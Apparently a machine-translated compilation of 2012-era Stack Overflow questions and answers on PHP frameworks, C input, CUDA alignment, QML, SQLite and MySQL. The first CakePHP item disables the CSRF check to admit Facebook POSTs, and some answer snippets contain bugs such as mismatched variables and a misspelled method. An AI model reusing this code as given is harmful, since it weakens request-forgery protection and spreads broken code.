**仅供参考：我收到“黑洞”错误。**

**最终更新（在@tigrang的回答之后）：**

```
public function beforeFilter() {
    parent::beforeFilter();
    $this->Auth->allow('*');

    $this->set('hasLiked', false);

    if(isset($this->request->data['signed_request'])){
        $this->set('hasLiked', $this->hasLiked($this->request->data['signed_request']));
    } 

    if(isset($this->request->data['Memberx']['signed_request'])) {
        $this->set('hasLiked', $this->hasLiked($this->request->data['Memberx']['signed_request']));  
    }

    /* 
    To go around Facebook's post $_REQUEST['signed_request'],
    we unset the $_REQUEST['signed_request'] and disable the csrfCheck
    ONLY after we have set the hasLiked view variable
    */
    unset($this->request->data['signed_request']);
    if (empty($this->request->data)) {
       $this->Security->csrfCheck = false;
    }        
} 
```

然后，我在我的观点中做了如下的事情：

```
<?php
if($hasLiked) {
?>
    You have liked this page!
<?php
}
?> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-05T23:23:47.453

```
public function beforeFilter() {
    parent::beforeFilter();
    $this->Auth->allow('*');
    $this->_validateFbRequest();
}

protected function _valdiateFbRequest() {
   if (!isset($this->request->data['signed_request'])) {
       // not a valid request from fb
       // throw exception or handle however you want
       return;
   }
   $signedRequest = $this->request->data['signed_request'];
   unset($this->request->data['signed_request']);
   if (empty($this->request->data)) {
       $this->Security->csrfCheck = false;
   }
   // validate the request
} 
```

# php - 从数组中获取信息时的PHP未定义索引

> ID：11820886
> 
> 赞同：1
> 
> 时间：2012-08-05T23:11:00.343
> 
> 标签：php, arrays

在我看来，我目前正在`undefined-index`使用以下行

`<?php echo $contentMangement['cms_name']; ?>`

我从数据库中得到了很好的信息

![在此处输入图像描述](../Images/5de470a6f83c1776686aab4278bfd49d.png)

有人可以解释为什么我会收到此错误吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-05T23:15:01.060

似乎您正在处理一组对象。尝试：

```
<?php echo $contentMangement[0]->cms_name; ?> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-05T23:13:16.343

因为索引是`0`. 然后属性off*就是*。`cms_name`

```
$contentManagement[0]->cms_name 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-06T06:26:17.210

或者这可能会有所帮助：

```
<?php
error_reporting(E_ALL & ~E_NOTICE);
?> 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-05T23:14:29.943

`$contentManagement`看起来它是一个对象数组。对象不使用括号表示法 ( `[]`)，而是使用箭头表示法 ( `->`)。

因此，首先，您必须获取单项数组的元素：

```
$object = $contentManagement[0]; 
```

然后您可以访问该`cms_name`对象的属性：

```
$value = $object->cms_name; 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-05T23:14:13.263

在显式检索具有该索引的数组值之前，先尝试计算数组的大小

# php - 从 Zend Framework 2 中的路由获取 $_GET 参数

> ID：11820889
> 
> 赞同：7
> 
> 时间：2012-08-05T23:11:34.843
> 
> 标签：php, zend-framework, routing, zend-framework2, superglobals

Zend Framework 1 有一种非常简单的方法来解析 URL 路由并在 $_GET 超全局中设置找到的参数以便于访问。当然，您可以在控制器中使用 ->getParam($something)，但如果在 URL 中找到参数，**也**可以通过 $_GET 访问它。

网址示例`mypage.com/mymodule/mycontroller/myaction/someparam/5:`

ZF1

```
$this->getParam('someparam'); // 5
$_GET['someparam']; // 5 
```

ZF2

```
$this->getEvent()->getRouteMatch()->getParam('someparam'); // 5
$_GET['someparam'] // undefined index someparam 
```

显然，不同之处在于 ZF2 没有将路由参数放入 $_GET 超全局变量中。

我如何使它将解析的参数放入 $_GET 超全局，因为扩展控制器并只定义一个构造函数是不可能的（因为 RouteMatch 还不是一个对象，不能从控制器的构造函数中调用）？

调用`$_GET = $this->getEvent()->getRouteMatch()->getParam('someparam');`我的每个控制器都可以，但我不希望这样。

换句话说，按照上面的示例 URL，我希望能够执行 $_GET['someparam'] 并且仍然在应用程序的任何组件中获得值“5”。

编辑：看起来我不够清楚，所以我会尝试澄清更多。我希望我通过 /key/value 格式在 URL 中输入的任何参数都可以立即在 $_GET 中使用。我在获取参数方面真的没有问题，我知道如何获取它，我扩展了 Zend 的控制器，所以我可以像在 ZF1 中一样再次调用 $this->getParams，现在所有控制器都扩展了那个，我只是想要URL 中的参数也自动位于 $_GET 中，因此我可以在本机使用 $_GET 的第三方组件中轻松访问它们。

编辑 2：更新为对 Samuel Herzog 的回答的反应：在这种情况下，我真的不介意使 SRP 无效，因为这些库的构建方式使得它们需要直接访问 $_GET - 它们进行自己的过滤并直接依赖在这个超全球。他们还直接获取 $_FILES 和 $_POST 进行处理，这正是他们的代码的工作方式。

我在抽象控制器中创建了以下方法： $this->mergeGet(); 这基本上使 $_GET 吸收了所有路由匹配的参数，并且一切都按预期工作，但是由于每个控制器/动作都需要库，因此每次调用该方法可能会变得乏味。如果只有控制器有一个像 ZF1 中的 init() 方法......

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2013-01-15T03:03:48.630

在 ZF2 中，我使用这个

```
$getparams = $this->getRequest()->getQuery(); 
```

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2012-08-06T17:14:15.450

首先，`$_GET`如果您在面向对象的堆栈上构建，则不应直接使用或任何其他超全局。SRP 以这种方式失效。

如果您无法更改（第 3 方？）库的更改方式，您可能想挂接到 MvcEvent，听 --event-- 然后获取`RouteMatch`，您可以填充`$_GET`一个简单的循环。

对于最佳性能的答案，您应该知道是否每个操作都需要命名库，仅用于一个模块，还是仅在某些控制器/操作中。如果最新的是您的用例，您应该编写一个控制器插件。

第一种方法的一些示例代码：

```
namespace YourModule;
use Zend\EventManager\EventInterface as Event;
use Zend\Mvc\MvcEvent;

class Module
{
    ...

    public function onBootstrap(Event $ev)
    {
        $application = $e->getApplication();
        $eventManager = $application->getEventManager();

        $eventManager->attach('route', function(MvcEvent $mvcEvent) {
            $params = $mvcEvent->getRouteMatch()->getParams();

            foreach ( $params as $name => $value )
            {
                if ( ! isset($_GET[$name]) 
                {
                    $_GET[$name] = $value;
                }
            }
        });
    }
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2016-05-27T01:47:03.213

您可以在控制器中使用：

```
 $paramValue = $this->params()->fromQuery('your_param_here'); 
```

问候

# c++ - 使用 QML 更改 C++ 模型

> ID：11820894
> 
> 赞同：3
> 
> 时间：2012-08-05T23:12:17.737
> 
> 标签：c++, qml

我想从 Qt 文档中扩展名为“Object ListModel Example”的示例（您可以在[http://qt-project.org/doc/qt-4.8/declarative-modelviews-objectlistmodel.html](http://qt-project.org/doc/qt-4.8/declarative-modelviews-objectlistmodel.html)上获得它）。

我正在尝试添加一个简单的 GUI 功能：更改模型中第一个数据项的内容（即名称）的菜单项。像这样的东西：

```
MenuItem {
  text: "Item 123"
  onClicked: {
    myModel.setProperty(0,"name","Item 123") //this gives me error
  }
} 
```

我可以在 QML 中创建一个菜单，但我找不到在模型中进行更改的正确方法。

顺便说一句，setContextProperty 和 qmlRegisterType 之间有什么区别（此示例中仅使用第一个，但许多其他示例包括第二个）。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-06T00:06:51.153

那种模型真的不适合改装。视图无法收到更改通知。更好的选择是使用 QAbstractItemModel：http: [//qt-project.org/doc/qt-4.8/declarative-modelviews-abstractitemmodel.html](http://qt-project.org/doc/qt-4.8/declarative-modelviews-abstractitemmodel.html)

使用 QAbstractItemModel 的更简单方法是通过 QStandardItemModel：http: [//qt-project.org/doc/qt-4.8/qstandarditemmodel.html](http://qt-project.org/doc/qt-4.8/qstandarditemmodel.html)

setContextProperty() 将单个命名属性添加到上下文中。qmlRegisterType() 向 QML 引擎注册一个 QObject 派生类型，允许它实例化该类型。例如，QDeclarativeItem 类型在引擎中注册为“Item”，这就是引擎`Item {}`在 QML 代码中出现时知道要创建什么的方式。

# python - 如何使用 Python 列表推导来加载 sqlite 表？

> ID：11820896
> 
> 赞同：0
> 
> 时间：2012-08-05T23:12:21.137
> 
> 标签：python, sqlite

我是 SQLite 方面的新手，也是 Python 方面的相对菜鸟。我正在为演示应用程序收集过程仪表数据。我写了这段代码：

```
from DAQ_Util import *
from sqlite3 import *

print 'Setting up memory-resident SQL database...'
BenchDB = connect(':memory:')
DBTableSetup = BenchDB.cursor()
DBTableSetup.execute("create table ss2000 (timestamp, var1, var2, var3, var4, var5, var6, var7,  var8, var9)")
DBTableSetup.close()

# Access data from SS2000 TDL Sensor
instReading = ss2000serialRead('192.168.1.121', 4001, 57)
print instReading
SS2000TabPopulate = BenchDB.cursor()
SS2000TabPopulate.execute("insert into ss2000 values (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
[instReading(i) for i in instReading])

print '...Done' 
```

DAQ_Util 模块是用于从仪器中获取过程数据的例程集合。`ss2000serialRead`来自 DAQ_Util 并从此类仪器中引入数据字符串列表。部分数据转载如下。我要做的就是`sqlite`使用列表理解将此数据写入表。它不起作用，我不知道如何解释错误消息，尽管我认为比我更了解 Python 的人可能会立即发现错误，或者我希望... :o) 屏幕输出转储如下：

```
$ python SQLite-test.py
Setting up memory-resident SQL database...
  Try connecting to serial server...
['2012-08-05 16:52:49.548095', '20.0000', '0.0000', '13.5', '76.60', '8190', '1640', '240', '-13', '79.40']
Traceback (most recent call last):
  File "SQLite-test.py", line 17, in <module>
[instReading(i) for i in instReading])
TypeError: 'list' object is not callable 
$ 
```

有人可以指出错误吗？谢谢！

谢谢伊格纳西奥，这里是更正的代码：

```
# Access data from SS2000 TDL Sensor
instReading = ss2000serialRead('192.168.1.121', 4001, 57)
print instReading
SS2000TabPopulate = BenchDB.cursor()
SS2000TabPopulate.execute("insert into ss2000 values (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
                        instReading) 
```

==== 红色

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-05T23:15:15.797

`instReading`*已经*是一个序列。

```
....execute(..., instReading) 
```

# iphone - ios：在 iPhone 应用程序中设计购物车

> ID：11820899
> 
> 赞同：4
> 
> 时间：2012-08-05T23:13:03.653
> 
> 标签：iphone, ios, shopping-cart

我有一个在线订购应用程序的设计决定。我相信这个问题是针对更高级的 iOS/移动电子商务开发人员的，但我欢迎大家提供帮助。

我正在考虑安装一个像 WordPress 这样的 CMS 并添加一个购物车插件。如果我需要移动特定页面，那么我也将创建这些页面，如果我需要进行某些 PHP 调用，那么我也需要为其定制 API。付款页面显然也将使用电子商务插件完成。这一切看起来像是 1-3 个月的工作，但我很想从正确的道路上开始。因此，任何反馈或方向将不胜感激。

现在，我必须决定我的用户将如何从他们的 iPhone 上查看产品和购物车。我正在考虑开发一个 iPhone 应用程序以允许他们在线订购。显然，该应用程序不仅是页面的包装器，而且除了产品和购物车视图之外，还将具有其他有用的功能。

所以这是一个问题：

我正在考虑的应用程序是一个由两个视图“产品”和“购物车”组成的 UITabBar 应用程序。

**`HTTP`选项 1 - 带有单独帖子的本机控件，用于将产品添加到汽车并`GET`从购物车中读取。**

*   Product 视图实现了一个 native `UITableView`，每个项目都会打开一个 Custom `UITableViewCell`，用户可以在其中按下一个本地按钮来“添加”到购物车。当按下“添加”按钮时，`HTTP POST`会使用产品代码和数量生成一个，并在一个会话下以某种方式将其写入服务器的购物车。我仍然需要弄清楚如何获得购物车的会话密钥（这里的任何想法都会非常感谢）。

*   购物车视图也完全使用本机 UI 实现，我还没有弄清楚我需要什么，但它会为用户会话检索购物车的当前项目并显示它。显然，用户可以修改项目、添加评论、更改数量等。如果我需要在每次购物车中的某些内容发生变化时都进行 HTTP 帖子以与服务器上的购物车同步，这听起来很头疼，但是无论如何，CART 完全可以在本机 UI 中查看。

**选项 2 - Product 和 Cart 是我们可以使用 UIWebViews 查看和操作的页面**

*   产品视图只是在`UIWebView`网络上打开一个预制的产品页面，该页面显然必须是移动友好的，这样它才能在手机上看起来不错。当用户点击商品时，它会打开详细的产品网页，用户将有一个网页按钮可以点击，以便添加到购物车。当然，我可以使用标准`UIWebView`回调拦截这些点击，并检查请求 URL 以确定点击了哪个产品。

*   `UIWebView`另一个选项卡（以及）中的购物车视图，一旦单击，将向服务器的购物车页面发出请求，以在同一会话下显示购物车。当然，我需要弄清楚如何让两个 UIWebView 共享相同的会话，这样我才能得到正确的购物车。我还没有深入研究代码。

**选项 3 - 将产品视图和购物车完全保留在本地电话上，仅将最终“订单”推送到服务器以跟踪付款页面**

*   在应用程序启动时，我下载产品目录，重置本地购物车并在应用程序中模拟购物车逻辑。一旦用户准备好结帐，我会最后一次调用付款页面，其中包含所有请求的产品和数量。然后，用户将关注付款页面。

*   由于用户也可以使用网页下订单，因此我需要将所有逻辑复制到应用程序中，并完全从应用程序内部处理购物车。最后的“结账”还需要发送详细的产品代码，并带有“评论”到付款页面。我有没有提到还有一个用户注册过程？

1.  就可用性、效率和用户体验而言，哪些选项最适合？
2.  如果我选择选项 2，如何同步这两个视图？
3.  是否有任何人有经验的购物车解决方案？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2017-02-07T08:57:51.947

您可以使用 3rd 方库，

在 .h 文件中，只需像这样为 BBBadgeBarButtonItem 创建对象

```
BBBadgeBarButtonItem *barButton; 
```

之后在您的 .m 文件中将您的自定义按钮设置为该 barButton，

```
barButton = [[BBBadgeBarButtonItem alloc] initWithCustomUIButton:yourBtnOutlet];
barButton.badgeValue = @"0";
barButton.badgeOriginX = 13;
barButton.badgeOriginY = -9; 
```

在您回复之后我们可以使用这行代码，它将增加计数值

```
barButton.badgeValue = [NSString stringWithFormat:@"%d", [barButton.badgeValue intValue] + 1]; 
```

# c - 为什么我必须重复一个介绍句？

> ID：11820902
> 
> 赞同：3
> 
> 时间：2012-08-05T23:13:33.417
> 
> 标签：c, string, char

我想读取两个字符，所以我执行以下代码：

```
main() {
    char a,b;

    printf("\nEnter the first char.. ");
    a=getchar();
    printf("\nEnter the second char.. ");
    b=getchar();
    b=getchar();       //<--I've to add this sentence because the previously doesn't work

    printf("\nFirst char --> %c",a);
    printf("\nSecond char --> %c",b);

} 
```

该代码**不应该**工作，但确实可以。输出是正确的：

> 第一个字符 --> z
> 
> 第二个字符-> z（'z'或我想要的字符）

如果我删除第二个`getchar()`，那么输出是：

> 第一个字符 --> z
> 
> 第二个字符 --> （这里没有字符）

# 如何删除第二个`getchar()`而不会出现任何错误？

因为`fflush(stdin)`之前`getchar()`不行。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-05T23:18:07.903

试试这个：制作一个文件`data`，大小为*两个字节*，精确包含`ab`. 现在说：

```
./myprogram < data 
```

瞧。

关键是，当您操作终端并按下`a`回车键时，您正在向进程发送*两个*字符，首先是换行符`a`，然后`\n`是换行符。所以第二个`getchar`拿起换行符。

（并且您的终端不允许您在不按 Enter 的情况下发送单个字符，因为它有一个行缓冲区，在发送任何内容之前它会填满。）

简而言之，`getchar`它是一个糟糕的 I/O 原语，您几乎应该总是喜欢`fgets`阅读整行并处理它们。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-06T04:09:00.433

如其他答案所示，问题是由**回车**引起的。

有很多方法可以解决这个问题，有些方法比其他方法更复杂。因此，我将指出我发现的最简单的方法：

正如[GNU 网站指出](http://www.gnu.org/software/libc/manual/html_node/Character-Input.html)的那样，最合适的功能是`getc(stream)`，我引用：

> 这就像**fgetc**，除了它是允许的（并且是典型的）它被实现为一个**不止一次****评估流** 参数的宏。**getc**通常是高度优化的，因此它通常**是读取单个字符的最佳函数**。

 ******我将它付诸实践**，但**它仍然存在**CR**问题，所以我打印了这个函数的结果，并注意到它**在 CR 时返回 10**。在此之后，我试图获得代码的功能和清晰度。为此尽一切可能，现在我的代码如下：

```
main() {
    char a,b;

    printf("\nEnter the first char.. ");
    if ((a=getc(stdin))==10) a=getc(stdin);
    printf("\nEnter the second char.. ");
    if ((b=getc(stdin))==10) b=getc(stdin);

    printf("\nFirst char --> %c",a);
    printf("\nSecond char --> %c",b);

} 
```

和不错的输出：

> 第一个字符 --> z
> 
> 第二个字符-> z（'z'或我想要的字符）

* * *

我了解到所有程序都需要他们自己的解决方案，与其他程序不同，这就是*（我认为）*功能如此之多的原因。我能说的是“总是要适应程序。也许这句话对我有用，但不能保证适用于其他代码。”

感谢所有帮助过我的人！

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-05T23:18:35.467

听起来您的`getchar()`函数将换行符留在键盘缓冲区中。这意味着第一个`b=getchar();`读取换行符，第二个读取您期望的实际输入。如果您有可用的功能，更优雅的方法是忽略换行符`ignore()`。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-05T23:18:53.817

[getchar()](http://www.cplusplus.com/reference/clibrary/cstdio/getchar/)只获取一个字符。换行符需要一个字符，因此您需要在代码中使用额外的 getchar() 才能获得所需的输入/输出。******

# php - 从 MySQL 数据库为购物车创建分类列表？

> ID：11820904
> 
> 赞同：1
> 
> 时间：2012-08-05T23:14:00.657
> 
> 标签：php, mysql

我创建的数据库看起来像这样

```
cat_id   cat_parent_id cat_name  cat_decs
11         0             Men       for men
12         0             Women     for women
13         11            Men clothing  123
14         12            Women cloth   434 
```

我想这样打印

```
Men
  Men clothing
Women
  Women cloth 
```

无论是在我的菜单栏还是在组合框中，我都试图找到解决方案，但一切都消失了，我已经使用了这个功能，但它是这样打印的

```
Men
Women
Men clothing
Women cloth

function buildCategoryOptions($catId = 0)
{

    //die();
    $sql = "SELECT cat_id, cat_parent_id, cat_name
            FROM tbl_category
            ORDER BY cat_id";
    $result = mysql_query($sql) or die('Cannot get Product. ' . mysql_error());

    $categories = array();
    while($row = mysql_fetch_array($result)) {
        list($id, $parentId, $name) = $row;
        //echo $id, $parentId, $name;

        if ($parentId == 0) {
            // we create a new array for each top level categories
            $categories[$id] = array('name' => $name, 'children' => array());

        } 

            else {
            // the child categories are put int the parent category's array
            $categories[$parentId]['children'][] = array('id'=> $id, 'name'=> $name);   

        }

    }   
      echo ($categories[28]['children'][0]['name']);
    // build combo box options

    $list = '';
    foreach ($categories as $key => $value) {
        $name= @$value['name'];
        //print_r($value['name']);

        $children = $value['children'];     
        $list .= "<optgroup label=\"$name\">"; 

        foreach ($children as $child) {
            $list .= "<option value=\"{$child['id']}\"";
            if ($child['id'] == $catId) {
                $list.= " selected";
            }

            $list .= ">{$child['name']}</option>\r\n";

        }

        $list .= "</optgroup>";
        //die();
    }
    //die();
    return $list;
} 
```

# sockets - tcp socket server 获取使用的服务器客户端的名称

> ID：11820909
> 
> 赞同：0
> 
> 时间：2012-08-05T23:14:58.800
> 
> 标签：sockets, tcp

假设我有一个服务器，它有多个解析为其 IP 地址的域名。例如，我的服务器是 10.0.0.33，可以通过`serverA.mysite.com`、`serverB.mysite.com`和访问`serverC.mysite.com`。如果我有一个使用类似于以下代码的进程运行：

```
#!/usr/bin/env python

import socket

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.listen(5)

while True:
   client, client_addr = server.accept()
   #server_name = <some function>(client)
   #Do Something with the client knowing the value of servername...

server.close() 
```

有没有办法确定客户端建立的 tcp 连接是针对`serverA.mysite.com`还是`serverB.mysite.com`……？

我的示例在 python 中，但我不需要特定于 python 的答案。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-05T23:19:44.687

不，TCP/IP 连接在 IP 地址级别工作，因此您无法确定客户端如何获取服务器正在侦听的 IP 地址。

HTTP 通过要求（从 1.0 开始）客户端将原始主机名作为请求数据的一部分发送来解决此问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-06-14T13:04:15.927

我相信 -`INADDR_ANY ("0.0.0.0")`如果您在多个端口上侦听，您正在侦听并想确切知道客户端连接到哪一个？这相当简单，您应该`s.getsockname`在`accept`. 所以你的代码看起来像这样

```
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(("0.0.0.0", 10000))
s.listen(5)
while True:
    s2 = s.accept()
    print s2.getsockname()
    s2.close() 
```

# cuda - 在输入数据中使用各种偏移量时，CUDA 内核启动失败

> ID：11820912
> 
> 赞同：2
> 
> 时间：2012-08-05T23:15:34.357
> 
> 标签：cuda, memory-alignment

我的代码给出了一条错误消息，我正试图追查它的原因。为了更容易找到问题，我删除了显然与导致错误消息无关的代码。如果您能告诉我为什么以下简单代码会产生错误消息，那么我认为我应该能够修复我的原始代码：

```
#include "cuComplex.h"
#include <cutil.h>

__device__ void compute_energy(void *data, int isample, int nsamples) {
  cuDoubleComplex * const nminusarray          = (cuDoubleComplex*)data;
  cuDoubleComplex * const f                    = (cuDoubleComplex*)(nminusarray+101);
  double          * const abs_est_errorrow_all = (double*)(f+3);
  double          * const rel_est_errorrow_all = (double*)(abs_est_errorrow_all+nsamples*51);
  int             * const iid_all              = (int*)(rel_est_errorrow_all+nsamples*51);
  int             * const iiu_all              = (int*)(iid_all+nsamples*21);
  int             * const piv_all              = (int*)(iiu_all+nsamples*21);
  cuDoubleComplex * const energyrow_all        = (cuDoubleComplex*)(piv_all+nsamples*12);
  cuDoubleComplex * const refinedenergyrow_all = (cuDoubleComplex*)(energyrow_all+nsamples*51);
  cuDoubleComplex * const btplus_all           = (cuDoubleComplex*)(refinedenergyrow_all+nsamples*51);

  cuDoubleComplex * const btplus           = btplus_all+isample*21021;

  btplus[0] = make_cuDoubleComplex(0.0, 0.0);
}

__global__ void computeLamHeight(void *data, int nlambda) {
  compute_energy(data, blockIdx.x, nlambda);
}

int main(int argc, char *argv[]) {
  void *device_data;

  CUT_DEVICE_INIT(argc, argv);
  CUDA_SAFE_CALL(cudaMalloc(&device_data, 184465640));
  computeLamHeight<<<dim3(101, 1, 1), dim3(512, 1, 1), 45000>>>(device_data, 101);
  CUDA_SAFE_CALL(cudaThreadSynchronize());
} 
```

我正在使用 GeForce GTX 480，我正在编译代码，如下所示：

```
nvcc -L /soft/cuda-sdk/4.0.17/C/lib -I /soft/cuda-sdk/4.0.17/C/common/inc -lcutil_x86_64 -arch sm_13 -O3 -Xopencc "-Wall" Main.cu 
```

输出是：

```
Using device 0: GeForce GTX 480
Cuda error in file 'Main.cu' in line 31 : unspecified launch failure. 
```

编辑：我现在进一步简化了代码。以下更简单的代码仍会产生错误消息：

```
#include <cutil.h>

__global__ void compute_energy(void *data) {
  *(double*)((int*)data+101) = 0.0;
}

int main(int argc, char *argv[]) {
  void *device_data;

  CUT_DEVICE_INIT(argc, argv);
  CUDA_SAFE_CALL(cudaMalloc(&device_data, 101*sizeof(int)+sizeof(double)));
  compute_energy<<<dim3(1, 1, 1), dim3(1, 1, 1)>>>(device_data);
  CUDA_SAFE_CALL(cudaThreadSynchronize());
} 
```

现在很容易看出偏移量应该是有效的。我尝试运行 cuda-memcheck 并显示以下内容：

```
========= CUDA-MEMCHECK
Using device 0: GeForce GTX 480
Cuda error in file 'Main.cu' in line 13 : unspecified launch failure.
========= Invalid __global__ write of size 8
=========     at 0x00000020 in compute_energy
=========     by thread (0,0,0) in block (0,0,0)
=========     Address 0x200200194 is misaligned
=========
========= ERROR SUMMARY: 1 error 
```

我尝试搜索互联网以查找地址未对齐的含义，但我未能找到解释。什么是交易？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-06T17:13:05.463

用所有这些神奇的常量来解析你的原始代码是非常困难的，但是你更新的 repro 案例使问题立即显而易见。GPU 架构要求所有指针与字边界对齐。您的内核包含一个未正确字对齐的指针访问。双精度是 64 位类型，并且您的寻址未与偶数 64 位边界对齐。这个：

```
*(double*)((int*)data+100) = 0.0; // 50th double 
```

或这个：

```
*(double*)((int*)data+102) = 0.0; // 51st double 
```

都是合法的。这个：

```
*(double*)((int*)data+101) = 0.0; // not aligned to a 64 bit boundary 
```

不是。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-06T04:35:07.283

该错误表示内存访问越界，请检查偏移值。

# php - 使用 PDO，如何确保 UPDATE 语句成功？

> ID：11820914
> 
> 赞同：24
> 
> 时间：2012-08-05T23:16:08.033
> 
> 标签：php, mysql

似乎对于 INSERT 语句，可以使用`if (isset($connect->lastInsertId()))`它来检查 INSERT 语句是否成功。（如果我错了，请纠正我。）

但是对于一个 UPDATE 语句，我怎么知道它是否成功呢？

例如，我有一个这样的基本：

```
$statement=$connect->prepare("UPDATE users SET premium='1' WHERE userid=?");
$statement->execute(array($id)); 
```

提前非常感谢。问候

* * *

## 回答 #1

> 赞同：34
> 
> 时间：2012-08-05T23:19:43.580

这取决于你所说的“成功”是什么意思。如果您的意思是查询执行时没有失败，那么`PDO`将在失败时抛出异常或`FALSE`从中返回`PDOStatement::execute()`，具体取决于您设置的错误模式，因此在这种情况下，“成功”查询将只是执行方法执行的查询不返回`FALSE`或抛出异常。

如果您的意思是“成功”，因为实际上更新了行（而仅更新了 0 行），那么您需要检查 using [`PDOStatement::rowCount()`](http://php.net/manual/en/pdostatement.rowcount.php)，它将告诉您上一个查询中受影响的行数。

警告：对于`newvalue = oldvalue` `PDOStatement::rowCount()`返回零的更新。您可以使用

> `$p = new PDO($dsn, $u, $p, array(PDO::MYSQL_ATTR_FOUND_ROWS => true));`

为了禁用这种意外行为。

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2017-02-21T17:15:01.623

```
$stmt->execute();
$count = $stmt->rowCount();

if($count =='0'){
    echo "Failed !";
}
else{
    echo "Success !";
} 
```

# python - 使用 Python 写入文件——“虽然没有完成：”让我感到困惑

> ID：11820917
> 
> 赞同：6
> 
> 时间：2012-08-05T23:16:32.570
> 
> 标签：python, while-loop

我有不到一年的编程经验。在学习读写文件时，我遇到了这个教程：[http ://www.penzilla.net/tutorials/python/fileio/](http://www.penzilla.net/tutorials/python/fileio/)

本教程提供以下示例作为创建和写入文件的简单脚本：

```
# Let's create a file and write it to disk.
filename = "test.dat"
# Let's create some data:
done = 0
namelist = []
while not done:
    name = raw_input("Enter a name:")
    if type(name) == type(""):
        namelist.append(name)
    else:
        break

# Create a file object:
# in "write" mode
FILE = open(filename,"w")

# Write all the lines at once:
FILE.writelines(namelist)

# Alternatively write them one by one:
for name in namelist:
    FILE.write(name)

FILE.close() 
```

我复制了这段代码并通过 Python 2.7.3 Shell 运行它。我被反复提示输入附加到将写入文件的列表的字符串（这对我来说很有意义）。我不明白的是退出 While 循环的条件（“虽然未完成：”）。我认为这意味着我在提示符下键入 done 以退出循环并随后写入文件，但 done 没有任何效果。然后我认为在提示符下输入的任何非字符串都应该打破循环并写入文件。我根本无法打破循环；对于我在提示符下输入的任何内容，我只是再次提示“输入名称：”。

通过删除 While 循环并保留 if/else 语句，我使代码适用于单个提示。有人可以告诉我我在这里不明白的地方吗？我猜这是一个相当简单的概念，在教程中没有解释，因为它被认为是显而易见的。由于“完成”是一个如此常见的词，我无法找到任何 Python 特定的含义。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-05T23:23:36.417

我现在会停止学习该教程。代码不是 Pythonic，太复杂了，而且似乎已经过时了。

话虽如此，这就是我编写该教程代码的方式（是的，它做同样的事情，但只有*正确*的方式）：

```
with open('test.dat', 'w') as handle:
  while True:
    name = raw_input('Enter a name: ')

    if not name:
      break

    handle.write(name + '\n') 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-05T23:19:31.473

这不是你的错。该代码**无法**跳出循环。

```
if name == 'end':
  break 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-05T23:21:55.127

`done`在第 3 行分配一次：

```
done = 0 
```

因此，只要 done 仍然是“非 0”，while 循环就会继续循环：

```
while not done: 
```

即它将继续永远循环，除非它遇到一个`break`语句（第 11 行）。不幸的是，代码有缺陷，这永远不会发生。

如果您想在键入“完成”时停止，则将 if 语句更改为：

```
if name == "done": 
```

但是，请注意，`done`上面的文字字符串与之前分配的变量*无关。*`done`

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-05T23:21:10.137

首先，代码很糟糕。

在这种情况下，`done`是变量的名称。正如所写，它将永远循环，因为没有办法退出。

您应该停止遵循该教程并选择一个更好的教程：[http ://wiki.python.org/moin/BeginnersGuide/NonProgrammers](http://wiki.python.org/moin/BeginnersGuide/NonProgrammers)

# mysql - 我的第一个 MySQL 程序...神秘的错误

> ID：11820918
> 
> 赞同：0
> 
> 时间：2012-08-05T23:16:36.457
> 
> 标签：mysql

这是我在使用 MS SQL procs 的丰富经验之后的第一个 MySQL proc。在 MySQL Workbench 中，唯一的警报位于整个 proc 的 End 行，但它没有提供任何细节。

在完成了其他一些事情之后，我现在剩下的就是这个错误......

错误代码：1064 您的 SQL 语法有错误；检查与您的 MySQL 服务器版本相对应的手册，以在第 1 行的 '' 附近使用正确的语法

顺便说一句，我的所有变量都有@，但我确信这是一个问题。不确定它是否是/现在？

这是程序...

```
-- --------------------------------------------------------------------------------
-- Routine DDL
-- --------------------------------------------------------------------------------
DELIMITER $$

CREATE PROCEDURE `dbname`.`ImportAccountToGravityForm` ()
BEGIN

  DECLARE intForm_id INTEGER;
  DECLARE intLead_id_current INT;
  DECLARE fltField_number_current FLOAT;
  DECLARE vcrValue_current VARCHAR(200);
  DECLARE intWeb_Site_Member_ID INT; -- id in import table
  DECLARE vcrValue2 VARCHAR(200);  -- SCHOOL
  DECLARE vcrValue7 VARCHAR(200);  -- ADDRESS LINE 1
  DECLARE vcrValue8 VARCHAR(200);  -- CITY
  DECLARE vcrValue9 VARCHAR(200); -- STATE
  DECLARE vcrValue10 VARCHAR(200); -- ZIP
  DECLARE vcrValue11 VARCHAR(200); -- COUNTRY
  DECLARE vcrValue12 VARCHAR(200);  -- NON-STUDENT/STUDENT
  DECLARE vcrValue13 VARCHAR(200);  -- CLASS OF
  DECLARE vcrValue14 VARCHAR(200);  -- DESCRIPTION
  DECLARE vcrValue16 VARCHAR(200);  -- EMAIL
  DECLARE vcrValue17 VARCHAR(200);  -- AWARD
